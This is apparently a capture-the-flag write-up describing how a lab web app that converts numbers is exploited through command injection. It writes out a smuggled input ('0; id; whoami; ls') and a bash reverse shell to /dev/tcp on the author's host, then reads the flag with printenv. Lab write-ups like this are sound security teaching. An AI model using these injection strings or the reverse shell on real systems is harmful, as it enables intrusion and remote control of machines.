Target IP: 10.10.153.221
Challenge Description:

Reconnaissance

Doing an aggressive port scan against the two open ports returns the result above. From the scans above, it looks like the target machine is running Ubuntu.

Enumeration

Port 80: HTTP

Browsing to this port displays the web application above. Before testing the web application, I viewed the source code and I did not find anything useful.


I sent the input 67000 and obtained the result above. The web application successfully converted this input. Maybe I can perform command injection via this input.


And bingo! I sent the commands 0; id; whoami; ls and obtained the result above. The target machine successfully executed the commands after 0; . The ; character is used to separate the commands. Time to obtain a reverse shell connection.

Exploitation & Flag


Since the web application is vulnerable to command injection, I started a listener on port 8443 and sent the bash reverse shell /bin/bash -i >& /dev/tcp/10.14.55.153/8443 0>&1 as shown above. And then I obtained a reverse shell connection from the target machine on my machine at port 8443 with the session as challenge.


This challenge does not require local privilege escalation, as the flag is stored in an environment variable called FLAG. Running printenv shows the flag above. This was a fun command injection challenge.
